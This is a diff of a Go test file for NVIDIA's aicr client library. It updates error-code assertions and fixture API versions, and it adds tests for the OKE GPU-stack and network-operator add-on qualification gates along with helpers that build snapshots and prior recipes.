@@ -17,6 +17,7 @@ package aicr_test
 import (
 	"context"
 	"errors"
+	"fmt"
 	"os"
 	"path/filepath"
 	"reflect"
@@ -24,8 +25,10 @@ import (
 	"sync"
 	"testing"
 
+	"github.com/NVIDIA/aicr/pkg/bundler/bundleinfo"
 	aicr "github.com/NVIDIA/aicr/pkg/client/v1"
 	aicrerrors "github.com/NVIDIA/aicr/pkg/errors"
+	"github.com/NVIDIA/aicr/pkg/errors/errorstest"
 	"github.com/NVIDIA/aicr/pkg/measurement"
 	"github.com/NVIDIA/aicr/pkg/recipe"
 	"github.com/NVIDIA/aicr/pkg/snapshotter"
@@ -203,7 +206,7 @@ func TestNewClientRejectsInvalidOCISourceConfiguration(t *testing.T) {
 				opts = append(opts, aicr.WithOCISourceTempDir(tt.tempDir))
 			}
 			_, err := aicr.NewClient(opts...)
-			if !errors.Is(err, aicrerrors.New(aicrerrors.ErrCodeInvalidRequest, "")) {
+			if errorstest.ReportedCode(err) != aicrerrors.ErrCodeInvalidRequest {
 				t.Errorf("NewClient() error = %v, want ErrCodeInvalidRequest", err)
 			}
 		})
@@ -216,7 +219,7 @@ func TestNewClientContextRejectsInvalidContext(t *testing.T) {
 	var nilContext context.Context
 	client, err := aicr.NewClientContext(nilContext,
 		aicr.WithRecipeSource(aicr.EmbeddedSource()))
-	if client != nil || !errors.Is(err, aicrerrors.New(aicrerrors.ErrCodeInvalidRequest, "")) {
+	if client != nil || errorstest.ReportedCode(err) != aicrerrors.ErrCodeInvalidRequest {
 		t.Fatalf("NewClientContext(nil) = (%v, %v), want nil ErrCodeInvalidRequest", client, err)
 	}
 
@@ -224,7 +227,7 @@ func TestNewClientContextRejectsInvalidContext(t *testing.T) {
 	cancel()
 	client, err = aicr.NewClientContext(ctx,
 		aicr.WithRecipeSource(aicr.EmbeddedSource()))
-	if client != nil || !errors.Is(err, aicrerrors.New(aicrerrors.ErrCodeCanceled, "")) {
+	if client != nil || errorstest.ReportedCode(err) != aicrerrors.ErrCodeCanceled {
 		t.Fatalf("NewClientContext(canceled) = (%v, %v), want nil ErrCodeCanceled", client, err)
 	}
 }
@@ -258,7 +261,7 @@ func TestNewClient_IsolatedDataProvider(t *testing.T) {
 	dirB := t.TempDir()
 	for _, dir := range []string{dirA, dirB} {
 		if err := os.WriteFile(filepath.Join(dir, "registry.yaml"),
-			[]byte("apiVersion: aicr.run/v1alpha2\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
+			[]byte("apiVersion: aicr.run/v1beta1\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
 			t.Fatalf("setup: write registry.yaml in %s: %v", dir, err)
 		}
 	}
@@ -306,7 +309,7 @@ func TestClient_ConcurrentResolveAndClose(t *testing.T) {
 
 	tmp := t.TempDir()
 	if err := os.WriteFile(filepath.Join(tmp, "registry.yaml"),
-		[]byte("apiVersion: aicr.run/v1alpha2\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
+		[]byte("apiVersion: aicr.run/v1beta1\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
 		t.Fatalf("setup: write registry.yaml: %v", err)
 	}
 
@@ -357,7 +360,7 @@ func TestClient_CloseIsIdempotent(t *testing.T) {
 
 	tmp := t.TempDir()
 	if err := os.WriteFile(filepath.Join(tmp, "registry.yaml"),
-		[]byte("apiVersion: aicr.run/v1alpha2\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
+		[]byte("apiVersion: aicr.run/v1beta1\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
 		t.Fatalf("setup: write registry.yaml: %v", err)
 	}
 
@@ -397,7 +400,7 @@ func TestResolveRecipeRejectsPinnedReferences(t *testing.T) {
 	// contain a registry.yaml. Write a minimal one so setup succeeds
 	// and we can exercise ResolveRecipe's pinned-rejection path.
 	tmp := t.TempDir()
-	minimalRegistry := "apiVersion: aicr.run/v1alpha2\nkind: ComponentRegistry\ncomponents: []\n"
+	minimalRegistry := "apiVersion: aicr.run/v1beta1\nkind: ComponentRegistry\ncomponents: []\n"
 	if err := os.WriteFile(filepath.Join(tmp, "registry.yaml"),
 		[]byte(minimalRegistry), 0o600); err != nil {
 		t.Fatalf("setup: write registry.yaml: %v", err)
@@ -458,7 +461,7 @@ func TestBundleComponents_RequiresInternalRecipeResult(t *testing.T) {
 
 	tmp := t.TempDir()
 	if err := os.WriteFile(filepath.Join(tmp, "registry.yaml"),
-		[]byte("apiVersion: aicr.run/v1alpha2\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
+		[]byte("apiVersion: aicr.run/v1beta1\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
 		t.Fatalf("setup: write registry.yaml: %v", err)
 	}
 	client, err := aicr.NewClient(aicr.WithRecipeSource(aicr.FilesystemSource(tmp)))
@@ -497,7 +500,7 @@ func TestBundleComponents_NilInputsRejected(t *testing.T) {
 
 	tmp := t.TempDir()
 	if err := os.WriteFile(filepath.Join(tmp, "registry.yaml"),
-		[]byte("apiVersion: aicr.run/v1alpha2\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
+		[]byte("apiVersion: aicr.run/v1beta1\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
 		t.Fatalf("setup: write registry.yaml: %v", err)
 	}
 
@@ -579,7 +582,7 @@ func TestResolveRecipe_RejectsNegativeNodes(t *testing.T) {
 	// never runs (negative Nodes rejection short-circuits before that),
 	// but NewClient still validates the source on construction.
 	if err := os.WriteFile(filepath.Join(tmp, "registry.yaml"),
-		[]byte("apiVersion: aicr.run/v1alpha2\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
+		[]byte("apiVersion: aicr.run/v1beta1\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
 		t.Fatalf("setup: write registry.yaml: %v", err)
 	}
 	client, err := aicr.NewClient(aicr.WithRecipeSource(aicr.FilesystemSource(tmp)))
@@ -624,7 +627,7 @@ func TestResolveRecipe_RejectsNegativeNodes(t *testing.T) {
 // like h100-eks-ubuntu-training-kubeflow. Without OS the asymmetric
 // matching defaults the query OS to "any", which excludes any overlay
 // pinning a specific OS — so platform mixins attached to those overlays
-// (e.g., platform-kubeflow → kubeflow-trainer) become unreachable.
+// (e.g., platform-kubeflow -> kubeflow-trainer) become unreachable.
 //
 // The assertion: H100/EKS/Ubuntu/Training/Kubeflow MUST include the
 // kubeflow-trainer component contributed by the platform-kubeflow mixin
@@ -638,7 +641,7 @@ func TestResolveRecipe_OSEnablesOSPinnedOverlays(t *testing.T) {
 	// ones) remain reachable for resolution.
 	tmp := t.TempDir()
 	if err := os.WriteFile(filepath.Join(tmp, "registry.yaml"),
-		[]byte("apiVersion: aicr.run/v1alpha2\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
+		[]byte("apiVersion: aicr.run/v1beta1\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
 		t.Fatalf("setup: write registry.yaml: %v", err)
 	}
 	client, err := aicr.NewClient(aicr.WithRecipeSource(aicr.FilesystemSource(tmp)))
@@ -688,7 +691,7 @@ func TestBundleAndValidate_RejectCrossClientRecipeResult(t *testing.T) {
 		t.Helper()
 		tmp := t.TempDir()
 		if err := os.WriteFile(filepath.Join(tmp, "registry.yaml"),
-			[]byte("apiVersion: aicr.run/v1alpha2\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
+			[]byte("apiVersion: aicr.run/v1beta1\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
 			t.Fatalf("setup: write registry.yaml: %v", err)
 		}
 		c, err := aicr.NewClient(aicr.WithRecipeSource(aicr.FilesystemSource(tmp)))
@@ -778,7 +781,7 @@ func TestClient_ConcurrentResolveScopesToOwnSource(t *testing.T) {
 	// is intentionally not in the embedded registry).
 	overlayYAML := func(marker string) string {
 		return `kind: RecipeMetadata
-apiVersion: aicr.run/v1alpha2
+apiVersion: aicr.run/v1beta1
 metadata:
   name: facade-test-marker-` + marker + `
 spec:
@@ -800,7 +803,7 @@ spec:
 		t.Helper()
 		dir := t.TempDir()
 		if err := os.WriteFile(filepath.Join(dir, "registry.yaml"),
-			[]byte("apiVersion: aicr.run/v1alpha2\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
+			[]byte("apiVersion: aicr.run/v1beta1\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
 			t.Fatalf("setup %s: registry.yaml: %v", marker, err)
 		}
 		if err := os.MkdirAll(filepath.Join(dir, "overlays"), 0o755); err != nil {
@@ -936,10 +939,10 @@ func TestResolveRecipeWithProfile(t *testing.T) {
 		t.Fatalf("setup overlays directory: %v", err)
 	}
 	if err := os.WriteFile(filepath.Join(dir, "registry.yaml"),
-		[]byte("apiVersion: aicr.run/v1alpha2\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
+		[]byte("apiVersion: aicr.run/v1beta1\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
 		t.Fatalf("setup registry.yaml: %v", err)
 	}
-	overlay := []byte(`apiVersion: aicr.run/v1alpha3
+	overlay := []byte(`apiVersion: aicr.run/v1beta2
 kind: RecipeMetadata
 metadata:
   name: profile-eks
@@ -1101,29 +1104,29 @@ func gpuOperatorDriverEnabled(t *testing.T, rec *aicr.RecipeResult) (bool, bool)
 }
 
 // TestResolveRecipeFromSnapshot_GPUDriverAutoDetect table-drives every
-// snapshot→resolve scenario the auto-detect must handle. Consolidates
+// snapshot->resolve scenario the auto-detect must handle. Consolidates
 // the earlier per-provider tests so a new case (e.g. an intent variant,
 // a future preinstalled-profile overlay) is a single row rather than a
 // new test function.
 //
 // Post-M1 behavior matrix:
-//   - AKS + Preinstalled → INJECTED. This test asserts only the
+//   - AKS + Preinstalled -> INJECTED. This test asserts only the
 //     driver.enabled=false injection. The rest of the coordinated AKS
 //     azure-managed profile (toolkit.enabled=false, operator.runtimeClass=
 //     nvidia-container-runtime, gdrcopy.enabled=false) is pinned by
 //     TestAKSDriverOnlyProfileTuple in pkg/recipe, and the DRA driver-root
 //     half by TestDriverRootLockstep — the override is semantically
 //     idempotent and safe because those values already declare the profile.
-//   - EKS + Preinstalled → SKIPPED. The bare EKS overlay carries no
+//   - EKS + Preinstalled -> SKIPPED. The bare EKS overlay carries no
 //     preinstalled-driver marker (base values.yaml has
 //     driver.enabled=true), so the gate refuses to land a lone
 //     driver.enabled=false and logs a warning instead. The bug fix
 //     waits on a full EKS preinstalled-driver overlay.
-//   - GKE-COS + Preinstalled → INJECTED. The GKE-COS values file
+//   - GKE-COS + Preinstalled -> INJECTED. The GKE-COS values file
 //     already declares driver.enabled=false plus the coordinated
 //     toolkit / driverInstallDir settings, so the override is
 //     semantically idempotent and safe.
-//   - Preinstalled-profile overlay (AKS, GKE-COS) + Absent → no
+//   - Preinstalled-profile overlay (AKS, GKE-COS) + Absent -> no
 //     override, but metadata.gpuDriverState=absent is recorded and a
 //     warning logged. The recipe assumes a platform-provided driver the
 //     cluster does not have (e.g. an AKS pool created with
@@ -1131,10 +1134,10 @@ func gpuOperatorDriverEnabled(t *testing.T, rec *aicr.RecipeResult) (bool, bool)
 //     CheckDriverOwnershipCoherence validation fail closed unless the
 //     GPU-Operator-managed --set overrides are supplied (resolution
 //     itself cannot fail: `aicr recipe` has no --set escape hatch).
-//   - EKS (operator installs the driver) + Absent → no override; state
+//   - EKS (operator installs the driver) + Absent -> no override. State
 //     recorded for auditability, bundle gate self-disarms because the
 //     operator installs the driver.
-//   - Any provider + Unknown (k8s-only snapshot) → no override, no
+//   - Any provider + Unknown (k8s-only snapshot) -> no override, no
 //     recorded state.
 func TestResolveRecipeFromSnapshot_GPUDriverAutoDetect(t *testing.T) {
 	t.Parallel()
@@ -1592,7 +1595,7 @@ func TestSelectFromRecipe(t *testing.T) {
 //
 // The failure is classified as a hydration failure, not a selector-path
 // failure: the outermost code is never ErrCodeNotFound, which is what lets
-// the REST handler map hydrate → 5xx and selector → 404 without a parallel
+// the REST handler map hydrate to 5xx and selector to 404 without a parallel
 // hydrate+select implementation.
 func TestSelectFromRecipeWithContextCancellation(t *testing.T) {
 	t.Parallel()
@@ -1778,7 +1781,7 @@ func TestClient_NoCacheGrowthAcrossManyCloseCycles(t *testing.T) {
 
 	tmp := t.TempDir()
 	if err := os.WriteFile(filepath.Join(tmp, "registry.yaml"),
-		[]byte("apiVersion: aicr.run/v1alpha2\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
+		[]byte("apiVersion: aicr.run/v1beta1\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
 		t.Fatalf("setup: write registry.yaml: %v", err)
 	}
 
@@ -1830,7 +1833,7 @@ func TestClient_NoCacheGrowthAcrossManyCloseCycles(t *testing.T) {
 // decoupled from OS-mixin constraints while still exercising real
 // embedded resolution (base + h100-any + eks + eks-training).
 const leafOverlayYAML = `kind: RecipeMetadata
-apiVersion: aicr.run/v1alpha2
+apiVersion: aicr.run/v1beta1
 metadata:
   name: aicr-loadrecipe-test
 spec:
@@ -1898,7 +1901,7 @@ func TestLoadRecipe_BareResultNoCriteria(t *testing.T) {
 	t.Parallel()
 
 	const bareResult = `kind: RecipeResult
-apiVersion: aicr.run/v1alpha2
+apiVersion: aicr.run/v1
 metadata:
   version: test
 componentRefs: []
@@ -1922,7 +1925,7 @@ componentRefs: []
 	if result == nil {
 		t.Fatal("LoadRecipe returned nil result")
 	}
-	// No criteria → empty facade Name, but Resolved() must still be
+	// With no criteria the facade Name is empty, but Resolved() must still be
 	// populated so downstream validate/evidence paths work.
 	if result.Name != "" {
 		t.Errorf("Name = %q, want empty for a criteria-less recipe", result.Name)
@@ -1930,6 +1933,271 @@ componentRefs: []
 	if result.Resolved() == nil {
 		t.Error("Resolved() = nil, want the loaded recipe")
 	}
+}
+
+// TestResolveRecipeFromSnapshot_OKEGpuStackQualification proves the OKE
+// gpuStack profile qualifies fail-closed end to end against a snapshot: the
+// add-on projection is the canonical signal for both values, and the legacy
+// device-plugin tripwire (in-cluster reading) additionally guards
+// operator-managed — a legacy cluster (add-on absent, legacy DaemonSet
+// active) can qualify NEITHER value, and a snapshot missing either reading
+// fails with "reading … is unavailable" rather than passing open.
+func TestResolveRecipeFromSnapshot_OKEGpuStackQualification(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name    string
+		profile string
+		snap    *aicr.Snapshot
+		wantErr string // "" => resolution succeeds
+	}{
+		{
+			name:    "add-on installed qualifies the default oci-managed",
+			profile: "",
+			snap:    okeQualificationSnapshot("installed", "none"),
+		},
+		{
+			name:    "add-on installed fails operator-managed closed",
+			profile: "gpuStack=operator-managed",
+			snap:    okeQualificationSnapshot("installed", "active"),
+			wantErr: `constraint "K8s.oke-addons.nvidia-gpu-plugin" failed`,
+		},
+		{
+			name:    "add-on absent with no legacy plugin qualifies operator-managed",
+			profile: "gpuStack=operator-managed",
+			snap:    okeQualificationSnapshot("absent", "none"),
+		},
+		{
+			name:    "add-on absent fails the default oci-managed closed",
+			profile: "",
+			snap:    okeQualificationSnapshot("absent", "none"),
+			wantErr: `constraint "K8s.oke-addons.nvidia-gpu-plugin" failed`,
+		},
+		{
+			name:    "non-ACTIVE lifecycle marker fails oci-managed closed",
+			profile: "",
+			snap:    okeQualificationSnapshot("addon-deleting", "none"),
+			wantErr: `constraint "K8s.oke-addons.nvidia-gpu-plugin" failed`,
+		},
+		{
+			name:    "non-ACTIVE lifecycle marker fails operator-managed closed",
+			profile: "gpuStack=operator-managed",
+			snap:    okeQualificationSnapshot("addon-deleting", "none"),
+			wantErr: `constraint "K8s.oke-addons.nvidia-gpu-plugin" failed`,
+		},
+		{
+			name:    "legacy plugin active trips operator-managed (double-advertisement guard)",
+			profile: "gpuStack=operator-managed",
+			snap:    okeQualificationSnapshot("absent", "active"),
+			wantErr: `constraint "K8s.oke-legacy-plugin.nvidia-gpu-device-plugin" failed`,
+		},
+		{
+			name:    "legacy plugin unknown (clientless snapshot) fails operator-managed closed",
+			profile: "gpuStack=operator-managed",
+			snap:    okeQualificationSnapshot("absent", "unknown"),
+			wantErr: `constraint "K8s.oke-legacy-plugin.nvidia-gpu-device-plugin" failed`,
+		},
+		{
+			name:    "legacy plugin active does not gate oci-managed (the add-on manages the same DaemonSet)",
+			profile: "",
+			snap:    okeQualificationSnapshot("installed", "active"),
+		},
+		{
+			name:    "snapshot without the add-on projection fails closed (reading unavailable)",
+			profile: "",
+			snap:    okeQualificationSnapshot("", "none"),
+			wantErr: "l40s-oke-training K8s.oke-addons.nvidia-network-operator ([NOT_FOUND]",
+		},
+		{
+			name:    "snapshot without the legacy-plugin reading fails operator-managed closed",
+			profile: "gpuStack=operator-managed",
+			snap:    okeQualificationSnapshot("absent", ""),
+			wantErr: `reading "K8s.oke-legacy-plugin.nvidia-gpu-device-plugin" is unavailable`,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+
+			c, err := aicr.NewClient(aicr.WithRecipeSource(aicr.EmbeddedSource()))
+			if err != nil {
+				t.Fatalf("NewClient: %v", err)
+			}
+			t.Cleanup(func() { _ = c.Close() })
+
+			crit, err := recipe.BuildCriteriaWithRegistry(nil,
+				recipe.WithServiceRegistry("oke"),
+				recipe.WithAcceleratorRegistry("l40s"),
+				recipe.WithIntentRegistry("training"),
+				recipe.WithOSRegistry("ol"),
+			)
+			if err != nil {
+				t.Fatalf("BuildCriteria: %v", err)
+			}
+
+			_, err = c.ResolveRecipeFromSnapshotWithProfile(t.Context(), aicr.WrapCriteria(crit), tt.snap, tt.profile)
+			if tt.wantErr != "" {
+				if err == nil || !strings.Contains(err.Error(), tt.wantErr) {
+					t.Fatalf("ResolveRecipeFromSnapshotWithProfile error = %v, want containing %q", err, tt.wantErr)
+				}
+				return
+			}
+			if err != nil {
+				t.Fatalf("ResolveRecipeFromSnapshotWithProfile: %v", err)
+			}
+		})
+	}
+}
+
+// TestResolveRecipeFromSnapshot_OKENetworkOperatorAddonGate checks that
+// resolving an OKE leaf that deploys network-operator fails, naming the
+// constraint, unless the snapshot reads the NvidiaNetworkOperator add-on as
+// absent.
+func TestResolveRecipeFromSnapshot_OKENetworkOperatorAddonGate(t *testing.T) {
+	t.Parallel()
+
+	const gate = "K8s.oke-addons.nvidia-network-operator"
+	tests := []struct {
+		name        string
+		accelerator string
+		os          string
+		platform    string
+		nnoState    string // NNO is the NVIDIA Network Operator add-on.
+		wantErr     string // "" => resolution succeeds
+	}{
+		{name: "l40s add-on absent qualifies", accelerator: "l40s", os: "ol", nnoState: "absent"},
+		{name: "l40s kubeflow add-on absent qualifies", accelerator: "l40s", os: "ol", platform: "kubeflow", nnoState: "absent"},
+		{name: "gb200 add-on absent qualifies", accelerator: "gb200", os: "ol", nnoState: "absent"},
+		{
+			name:        "l40s add-on installed fails closed",
+			accelerator: "l40s",
+			os:          "ol",
+			nnoState:    "installed",
+			wantErr:     "l40s-oke-training " + gate + " (expected absent, got installed)",
+		},
+		{
+			name:        "gb200 add-on installed fails closed",
+			accelerator: "gb200",
+			os:          "ol",
+			nnoState:    "installed",
+			wantErr:     "gb200-oke-training " + gate + " (expected absent, got installed)",
+		},
+		{
+			name:        "l40s kubeflow add-on installed fails closed",
+			accelerator: "l40s",
+			os:          "ol",
+			platform:    "kubeflow",
+			nnoState:    "installed",
+			wantErr:     "l40s-oke-training-kubeflow " + gate + " (expected absent, got installed)",
+		},
+		{
+			name:        "gb200 ubuntu add-on installed fails closed",
+			accelerator: "gb200",
+			os:          "ubuntu",
+			nnoState:    "installed",
+			wantErr:     "gb200-oke-ubuntu-training " + gate + " (expected absent, got installed)",
+		},
+		{
+			name:        "gb200 ubuntu kubeflow add-on installed fails closed",
+			accelerator: "gb200",
+			os:          "ubuntu",
+			platform:    "kubeflow",
+			nnoState:    "installed",
+			wantErr:     "gb200-oke-ubuntu-training-kubeflow " + gate + " (expected absent, got installed)",
+		},
+		{
+			name:        "add-on mid-create fails closed",
+			accelerator: "l40s",
+			os:          "ol",
+			nnoState:    "addon-creating",
+			wantErr:     "l40s-oke-training " + gate + " (expected absent, got addon-creating)",
+		},
+		{
+			name:        "missing reading fails closed",
+			accelerator: "gb200",
+			os:          "ol",
+			nnoState:    "",
+			wantErr:     "gb200-oke-training " + gate,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+
+			c, err := aicr.NewClient(aicr.WithRecipeSource(aicr.EmbeddedSource()))
+			if err != nil {
+				t.Fatalf("NewClient: %v", err)
+			}
+			t.Cleanup(func() { _ = c.Close() })
+
+			opts := []recipe.RegistryCriteriaOption{
+				recipe.WithServiceRegistry("oke"),
+				recipe.WithAcceleratorRegistry(tt.accelerator),
+				recipe.WithIntentRegistry("training"),
+				recipe.WithOSRegistry(tt.os),
+			}
+			if tt.platform != "" {
+				opts = append(opts, recipe.WithPlatformRegistry(tt.platform))
+			}
+			crit, err := recipe.BuildCriteriaWithRegistry(nil, opts...)
+			if err != nil {
+				t.Fatalf("BuildCriteria: %v", err)
+			}
+
+			snap := okeAddonsSnapshot("installed", tt.nnoState, "none")
+			_, err = c.ResolveRecipeFromSnapshotWithProfile(t.Context(), aicr.WrapCriteria(crit), snap, "")
+			if tt.wantErr != "" {
+				if err == nil || !strings.Contains(err.Error(), tt.wantErr) {
+					t.Fatalf("ResolveRecipeFromSnapshotWithProfile error = %v, want containing %q", err, tt.wantErr)
+				}
+				return
+			}
+			if err != nil {
+				t.Fatalf("ResolveRecipeFromSnapshotWithProfile: %v", err)
+			}
+		})
+	}
+}
+
+// okeQualificationSnapshot returns okeAddonsSnapshot with the
+// NvidiaNetworkOperator add-on absent.
+func okeQualificationSnapshot(addonState, legacyState string) *aicr.Snapshot {
+	return okeAddonsSnapshot(addonState, "absent", legacyState)
+}
+
+// okeAddonsSnapshot returns an OKE Snapshot at Kubernetes v1.34.0 with the
+// given NvidiaGpuPlugin, NvidiaNetworkOperator (NNO), and legacy device-plugin
+// readings. Constraints on an omitted reading fail as unavailable. Special
+// cases are:
+//
+//   - An empty addonState omits the oke-addons subtype, including nnoState.
+//   - An empty nnoState omits only the nvidia-network-operator key.
+//   - An empty legacyState omits the oke-legacy-plugin subtype.
+func okeAddonsSnapshot(addonState, nnoState, legacyState string) *aicr.Snapshot {
+	k8s := measurement.NewMeasurement(measurement.TypeK8s).
+		WithSubtypeBuilder(
+			measurement.NewSubtypeBuilder("server").
+				SetString(measurement.KeyVersion, "v1.34.0"),
+		)
+	if addonState != "" {
+		addons := measurement.NewSubtypeBuilder("oke-addons").
+			SetString("nvidia-gpu-plugin", addonState)
+		if nnoState != "" {
+			addons = addons.SetString("nvidia-network-operator", nnoState)
+		}
+		k8s = k8s.WithSubtypeBuilder(addons)
+	}
+	if legacyState != "" {
+		k8s = k8s.WithSubtypeBuilder(
+			measurement.NewSubtypeBuilder("oke-legacy-plugin").
+				SetString("nvidia-gpu-device-plugin", legacyState),
+		)
+	}
+	return aicr.WrapSnapshot(&snapshotter.Snapshot{
+		Measurements: []*measurement.Measurement{k8s.Build()},
+	})
 }
 
 // k8sVersionSnapshot builds a minimal Snapshot whose K8s/server/version
@@ -1975,6 +2243,17 @@ func gpuHardwareSnapshotPools(poolMode string, driverLoaded bool) *aicr.Snapshot
 				WithSubtypeBuilder(
 					measurement.NewSubtypeBuilder("server").
 						SetString("version", version),
+				).
+				// k8s.node.provider is the fingerprint source of truth for
+				// service (pkg/fingerprint.FromMeasurements), which
+				// NodeTopology.gpu-nodes.label reads to select its
+				// pre-deployment universe label per service (#2359). Real
+				// collector snapshots always include it; only the historical
+				// test fixtures didn't. Kept alongside "aks-gpu-pools" because
+				// both are AKS-shaped fixtures that also cover GKE flows.
+				WithSubtypeBuilder(
+					measurement.NewSubtypeBuilder("node").
+						SetString("provider", "gke"),
 				).
 				// The AKS gpuProfile.driver projection the pool-mode
 				// collector emits (Install = AKS preinstall, None =
@@ -2208,14 +2487,14 @@ func writeExternalCriterionData(t *testing.T, service string) string {
 	t.Helper()
 	dir := t.TempDir()
 	if err := os.WriteFile(filepath.Join(dir, "registry.yaml"),
-		[]byte("apiVersion: aicr.run/v1alpha2\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
+		[]byte("apiVersion: aicr.run/v1beta1\nkind: ComponentRegistry\ncomponents: []\n"), 0o600); err != nil {
 		t.Fatalf("setup: write registry.yaml: %v", err)
 	}
 	overlayDir := filepath.Join(dir, "overlays")
 	if err := os.MkdirAll(overlayDir, 0o755); err != nil {
 		t.Fatalf("setup: mkdir overlays: %v", err)
 	}
-	overlay := "apiVersion: aicr.run/v1alpha2\n" +
+	overlay := "apiVersion: aicr.run/v1beta1\n" +
 		"kind: RecipeMetadata\n" +
 		"metadata:\n  name: " + service + "-h100-training\n" +
 		"spec:\n  base: base\n  criteria:\n" +
@@ -2389,7 +2668,7 @@ func TestBundleComponents_DriverOwnershipPreflight(t *testing.T) {
 		return c, rec
 	}
 
-	t.Run("absent driver → resolution fails the profile constraint", func(t *testing.T) {
+	t.Run("absent driver -> resolution fails the profile constraint", func(t *testing.T) {
 		t.Parallel()
 		// Pre-profile, this state resolved with GPUDriverStateAbsent recorded
 		// and the driverless mismatch was caught by the bundle-time
@@ -2428,7 +2707,7 @@ func TestBundleComponents_DriverOwnershipPreflight(t *testing.T) {
 		}
 	})
 
-	t.Run("preinstalled driver → BundleComponents passes", func(t *testing.T) {
+	t.Run("preinstalled driver -> BundleComponents passes", func(t *testing.T) {
 		t.Parallel()
 		c, rec := newAKSRecipe(t, gpuHardwareSnapshot(true))
 
@@ -2487,7 +2766,7 @@ func TestSnapshotUnwrapRoundTrips(t *testing.T) {
 	t.Parallel()
 
 	internal := &snapshotter.Snapshot{}
-	internal.APIVersion = "aicr.run/v1alpha2"
+	internal.APIVersion = "aicr.run/v1"
 	internal.Kind = "Snapshot"
 	internal.Metadata = map[string]string{"version": "v9.9.9"}
 
@@ -2498,12 +2777,12 @@ func TestSnapshotUnwrapRoundTrips(t *testing.T) {
 
 	// A Snapshot built outside the facade has no internal payload; Unwrap
 	// rebuilds a minimal one so callers never nil-check a non-nil receiver.
-	bare := &aicr.Snapshot{APIVersion: "aicr.run/v1alpha2", Kind: "Snapshot"}
+	bare := &aicr.Snapshot{APIVersion: "aicr.run/v1", Kind: "Snapshot"}
 	rebuilt := bare.Unwrap()
 	if rebuilt == nil {
 		t.Fatal("Unwrap() on a facade-constructed Snapshot = nil, want a minimal reconstruction")
 	}
-	if rebuilt.APIVersion != "aicr.run/v1alpha2" || string(rebuilt.Kind) != "Snapshot" {
+	if rebuilt.APIVersion != "aicr.run/v1" || string(rebuilt.Kind) != "Snapshot" {
 		t.Errorf("Unwrap() lost public fields: %+v", rebuilt)
 	}
 
@@ -2588,6 +2867,777 @@ func TestResolveRecipeRuntimeInventoryMode(t *testing.T) {
 			if (resolveErr != nil) != tt.wantErr {
 				t.Fatalf("ResolveRecipeFromCriteriaWithOptions() error = %v, wantErr %v",
 					resolveErr, tt.wantErr)
+			}
+		})
+	}
+}
+
+// inheritTestRequest is the criteria the inherit-from tests resolve. Any
+// overlay with several components would do; this one is already exercised
+// elsewhere in this file, so a registry change that breaks it breaks a
+// louder test first.
+func inheritTestRequest(inheritFrom string) aicr.RecipeRequest {
+	return aicr.RecipeRequest{
+		Service:     "eks",
+		Accelerator: "h100",
+		OS:          "ubuntu",
+		Intent:      "training",
+		InheritFrom: inheritFrom,
+	}
+}
+
+func inheritTestClient(t *testing.T) *aicr.Client {
+	t.Helper()
+	client, err := aicr.NewClient(aicr.WithRecipeSource(aicr.EmbeddedSource()))
+	if err != nil {
+		t.Fatalf("NewClient: %v", err)
+	}
+	t.Cleanup(func() { _ = client.Close() })
+	return client
+}
+
+// priorRecipe writes a hydrated RecipeResult naming each component at the
+// namespace a previous resolution installed it into. The source and version
+// fields also let tests distinguish full inheritance from namespace-only
+// inheritance while satisfying the loader's coherence rules.
+func priorRecipe(t *testing.T, path string, namespaces map[string]string) string {
+	t.Helper()
+	doc := "kind: RecipeResult\napiVersion: aicr.run/v1\nmetadata:\n  version: test\ncomponentRefs:\n"
+	for _, name := range sortedKeys(namespaces) {
+		doc += fmt.Sprintf(
+			"  - name: %s\n    type: Helm\n    source: https://charts.invalid/prior\n    version: 1.0.0\n    namespace: %s\n",
+			name, namespaces[name])
+	}
+	if err := os.WriteFile(path, []byte(doc), 0o600); err != nil {
+		t.Fatalf("setup: write %s: %v", path, err)
+	}
+	return path
+}
+
+// priorBundle turns dir into a bundle carrying the namespaces prior recipes
+// carry plus the rendered per-release values a deployer wrote, which is the
+// only place a merged fullnameOverride is recorded by value.
+func priorBundle(t *testing.T, dir string, namespaces map[string]string, values map[string]map[string]any) string {
+	t.Helper()
+	if err := os.MkdirAll(dir, 0o750); err != nil {
+		t.Fatalf("setup: mkdir %s: %v", dir, err)
+	}
+	priorRecipe(t, filepath.Join(dir, "recipe.yaml"), namespaces)
+
+	releases := make([]bundleinfo.Release, 0, len(namespaces))
+	for i, name := range sortedKeys(namespaces) {
+		path := fmt.Sprintf("%03d-%s", i+1, name)
+		releases = append(releases, bundleinfo.Release{Name: name, Component: name, Path: path})
+		if err := os.MkdirAll(filepath.Join(dir, path), 0o750); err != nil {
+			t.Fatalf("setup: mkdir %s: %v", path, err)
+		}
+		doc, err := yaml.Marshal(values[name])
+		if err != nil {
+			t.Fatalf("setup: marshal values for %s: %v", name, err)
+		}
+		if err := os.WriteFile(filepath.Join(dir, path, "values.yaml"), doc, 0o600); err != nil {
